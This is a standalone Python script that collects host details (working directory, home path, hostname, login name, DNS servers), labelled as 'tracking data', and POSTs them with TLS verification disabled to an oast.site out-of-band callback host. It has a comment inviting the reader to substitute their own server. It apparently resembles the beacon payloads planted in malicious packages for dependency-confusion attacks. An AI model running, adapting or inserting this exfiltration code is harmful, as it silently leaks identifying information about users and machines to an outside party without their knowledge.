import os
import dns.resolver
import json
import urllib.parse
import urllib.request
import socket
import ssl

# Collect tracking data
tracking_data = {
    'c': os.path.dirname(os.path.abspath(__file__)),
    'hd': os.path.expanduser('~'),
    'hn': socket.gethostname(),
    'un': os.getlogin(),
    'dns': dns.resolver.Resolver().nameservers
}

# Encode tracking data as form data
post_data = urllib.parse.urlencode({'msg': json.dumps(tracking_data)}).encode('utf-8')

# Set up HTTPS request
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

url = 'https://cgefohl5s4m2d17pkof0txtatbxkbdizh.oast.site' # replace with your own server URL
req = urllib.request.Request(url, post_data, headers={'Content-Type': 'application/x-www-form-urlencoded'})

# Send HTTPS request
try:
    with urllib.request.urlopen(req, context=context) as res:
        print(res.read().decode('utf-8'))
except urllib.error.HTTPError as e:
    print(e)
except urllib.error.URLError as e:
    print(e.reason)
